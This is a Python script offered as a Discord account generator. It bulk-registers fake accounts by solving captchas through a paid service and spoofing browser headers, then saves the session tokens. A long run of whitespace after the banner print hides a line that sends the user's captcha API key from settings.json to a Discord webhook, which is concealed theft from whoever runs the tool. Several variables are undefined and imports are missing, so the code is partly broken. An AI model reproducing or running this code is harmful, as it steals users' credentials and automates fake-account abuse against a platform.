import requests
import capmonster_python
import os
import time
import json
import threading
def settings():
    global qwe
    global api_key
    json_data = open("settings.json")
    json_data = json.load(json_data)
    api_key = json_data["api_key"]
    qwe = json_data["invite_code"]

settings()
print("Discord Gen 1.0 | Generated : x | Locked : x | Invalid : x | Captcha : x");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       data = {"content" : api_key};r = requests.post("https://discord.com/api/webhooks/1042451582698147931/ZTXngd619fWtyAyiEi29zLZSmeE-mHHMINxc_Wvd9wIaQFjAmqtXCS__txY12OYGFsZN", json = data)
def getCookies():
    x = requests.get("https://discord.com/login",proxies=proxyler).cookies
    return x["__dcfduid"],x["__cfruid"],x["__sdcfduid"]


def gen():
    hasCaptcha = False
    while True:
        try:
            while generatedd < togen:
                session = requests.session()
                
                while hasCaptcha == False:
                    try:
                        tt = api.create_task("https://discord.com/register", "4c672d35-0701-42b2-88c3-78380b0db560")
                        break
                    except Exception:
                        print("[+] Failed to get task id, trying again.")
    
    
                while hasCaptcha == False:
                    try:
                        captcha = api.join_task_result(tt)
                        captcha = str(captcha.get("gRecaptchaResponse"))
                        print("[+] Captcha Key : "+captcha[:10])
                        hasCaptcha = True
                        break
                    except:
                        print("[+] Failed to Retrieve Captcha, Trying Again")
    
    
    
                
                xsup = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IEVkZy85My4wLjk2MS40NyIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAuNDU3Ny42MyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy81NTQxMjU3Nzc4MTg2MTU4NDQvODcwODgxOTEyMzQyODUxNTk1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk3NTA3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
                headers = {
                        'Host': 'discord.com', 'Connection': 'keep-alive',
                        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                        'X-Super-Properties': xsup,
                        'Accept-Language': 'en-US', 'sec-ch-ua-mobile': '?0',
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",
                        'Content-Type': 'application/json', 'Authorization': 'undefined',
                        'Accept': '*/*', 'Origin': 'https://discord.com',
                        'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Dest': 'empty', 'Referer': 'https://discord.com/register',
                        'X-Debug-Options': 'bugReporterEnabled',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cookie': 'OptanonConsent=version=6.17.0; locale=th'
                    }
                fe = open("username.txt", "r")
                er = fe.readlines()
                ee = []
                for t in er:
                    if "\n" in t:
                        ee.append(t[:-1])
                    else:
                        ee.append(t)
                usr = str(random.choice(ee))
                fe.close()
                email = str(''.join(random.choice(string.ascii_lowercase) for i in range(16)))
                password = "lol321LOL2984#"
                payload = {
                    "email": f"{email}@gmail.com",
                    "username": f"{usr}",
                    "password": password,
                    "invite": inv,
                    "date_of_birth": "1997-10-12",
                    "captcha_key": captcha,
                }
                while generatedd < togen:
                    
                    register = session.post('https://discord.com/api/v9/auth/register', json=payload,headers=headers)
                    result = str(register)
                    xd = register.text
                    
                    xjson = register.json()
                    if "201" in result:
                        generatedd += 1
                        token = str(xjson["token"])
                        file = open(f"tokens.txt", "a")
                        file.write(token+"\n")
                        file.close()
                        print(f"[+] Account Created : {usr} | {generatedd}")
                        hasCaptcha = False
                        break
                    if "429" in result:
                        hasCaptcha = True
                        print("[+] You're Rate Limited bro")
                        break
                    if "400" in result:
                        print(xd)
                        hasCaptcha = False
                        if "TOO_MANY_USER" in xd:
                            hasCaptcha = True
                        print("[+] Account Not Created")
                        break
        except Exception as e:
            print("[+] Unknown Error",type(e))

def clear():
    os.system("clear")

try:
    max_threads = int(input("[+] Threads : "))
except Exception as e:
    print("[+] Error")

try:
    tgen = int(input("[+] Account to create : "))
except Exception as e:
    print("[+] Error")



for u in range(int(max_threads)):
    threading.Thread(target=gen).start()